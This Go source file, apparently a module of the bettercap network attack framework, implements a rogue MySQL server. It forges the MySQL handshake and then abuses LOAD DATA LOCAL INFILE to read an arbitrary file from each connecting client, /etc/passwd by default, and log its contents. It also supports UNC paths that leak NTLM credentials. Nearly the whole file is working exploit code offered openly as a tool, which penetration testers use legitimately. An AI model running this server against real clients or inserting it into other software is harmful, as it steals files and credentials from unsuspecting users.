package modules

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"strings"

	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/session"
)

type MySQLServer struct {
	session.SessionModule
	address  *net.TCPAddr
	listener *net.TCPListener
	infile   string
}

func NewMySQLServer(s *session.Session) *MySQLServer {

	mysql := &MySQLServer{
		SessionModule: session.NewSessionModule("mysql.server", s),
	}
	mysql.AddParam(session.NewStringParameter("mysql.server.infile",
		"/etc/passwd",
		"",
		"File you want to read. UNC paths are also supported."))

	mysql.AddParam(session.NewStringParameter("mysql.server.address",
		session.ParamIfaceAddress,
		session.IPv4Validator,
		"Address to bind the mysql server to."))

	mysql.AddParam(session.NewIntParameter("mysql.server.port",
		"3306",
		"Port to bind the mysql server to."))

	mysql.AddHandler(session.NewModuleHandler("mysql.server on", "",
		"Start mysql server.",
		func(args []string) error {
			return mysql.Start()
		}))

	mysql.AddHandler(session.NewModuleHandler("mysql.server off", "",
		"Stop mysql server.",
		func(args []string) error {
			return mysql.Stop()
		}))

	return mysql
}

func (mysql *MySQLServer) Name() string {
	return "mysql.server"
}

func (mysql *MySQLServer) Description() string {
	return "A simple Rogue MySQL server, to be used to exploit LOCAL INFILE and read arbitrary files from the client."
}

func (mysql *MySQLServer) Author() string {
	return "Bernardo Rodrigues (https://twitter.com/bernardomr)"
}

func (mysql *MySQLServer) Configure() error {
	var err error
	var address string
	var port int

	if mysql.Running() == true {
		return session.ErrAlreadyStarted
	}

	if err, mysql.infile = mysql.StringParam("mysql.server.infile"); err != nil {
		return err
	}

	if err, address = mysql.StringParam("mysql.server.address"); err != nil {
		return err
	}

	if err, port = mysql.IntParam("mysql.server.port"); err != nil {
		return err
	}

	if mysql.address, err = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%d", address, port)); err != nil {
		return err
	}

	if mysql.listener, err = net.ListenTCP("tcp", mysql.address); err != nil {
		return err
	}

	return nil
}

func (mysql *MySQLServer) Start() error {
	if err := mysql.Configure(); err != nil {
		return err
	}

	return mysql.SetRunning(true, func() {
		log.Info("MySQL server starting on IP %s", mysql.address)

		MySQLGreeting := []byte{
			0x5b, 0x00, 0x00, 0x00, 0x0a, 0x35, 0x2e, 0x36,
			0x2e, 0x32, 0x38, 0x2d, 0x30, 0x75, 0x62, 0x75,
			0x6e, 0x74, 0x75, 0x30, 0x2e, 0x31, 0x34, 0x2e,
			0x30, 0x34, 0x2e, 0x31, 0x00, 0x2d, 0x00, 0x00,
			0x00, 0x40, 0x3f, 0x59, 0x26, 0x4b, 0x2b, 0x34,
			0x60, 0x00, 0xff, 0xf7, 0x08, 0x02, 0x00, 0x7f,
			0x80, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x68, 0x69, 0x59, 0x5f,
			0x52, 0x5f, 0x63, 0x55, 0x60, 0x64, 0x53, 0x52,
			0x00, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x6e,
			0x61, 0x74, 0x69, 0x76, 0x65, 0x5f, 0x70, 0x61,
			0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x00,
		}
		FirstResponseOK := []byte{
			0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02,
			0x00, 0x00, 0x00,
		}

		FileNameLength := byte(len(mysql.infile) + 1)
		GetFile := []byte{
			FileNameLength, 0x00, 0x00, 0x01, 0xfb,
		}
		GetFile = append(GetFile, mysql.infile...)

		SecondResponseOK := []byte{
			0x07, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02,
			0x00, 0x00, 0x00,
		}

		for mysql.Running() {

			// tcp listener
			conn, err := mysql.listener.AcceptTCP()
			if err != nil {
				log.Warning("Error while accepting TCP connection: %s", err)
				continue
			}

			// send the mysql greeting
			conn.Write([]byte(MySQLGreeting))

			// read the incoming responses and retrieve infile
			// TODO: include binary support and files > 16kb
			b := make([]byte, 16384)
			bufio.NewReader(conn).Read(b)

			// parse client capabilities and validate connection
			// TODO: parse mysql connections properly and
			//       display additional connection attributes
			clientCapabilities := fmt.Sprintf("%08b", (int(uint32(b[4]) | uint32(b[5])<<8)))
			if len(clientCapabilities) == 16 {
				remoteAddress := strings.Split(conn.RemoteAddr().String(), ":")[0]
				log.Info("MySQL connection from: %s", remoteAddress)
				loadData := string(clientCapabilities[8])
				log.Info("Can Use LOAD DATA LOCAL: %s", loadData)
				username := bytes.Split(b[36:], []byte{0})[0]
				log.Info("MySQL Login Request Username: %s", username)

				// send initial responseOK
				conn.Write([]byte(FirstResponseOK))
				bufio.NewReader(conn).Read(b)
				conn.Write([]byte(GetFile))
				infileLen, err := bufio.NewReader(conn).Read(b)
				if err != nil {
					log.Warning("Error while reading buffer: %s", err)
					continue
				}

				// check if the infile is an UNC path
				if strings.HasPrefix(mysql.infile, "\\") {
					log.Info("NTLM from '%s' relayed to %s", remoteAddress, mysql.infile)
				} else {
					// print the infile content, ignore mysql protocol headers
					// TODO: include binary support and output to a file
					log.Info("Retrieving '%s' from %s (%d bytes)\n%s", mysql.infile, remoteAddress, infileLen-9, string(b)[4:infileLen-4])
				}

				// send additional response
				conn.Write([]byte(SecondResponseOK))
				bufio.NewReader(conn).Read(b)

			}
			defer conn.Close()
		}
	})
}

func (mysql *MySQLServer) Stop() error {
	return mysql.SetRunning(false, func() {
		defer mysql.listener.Close()
	})
}
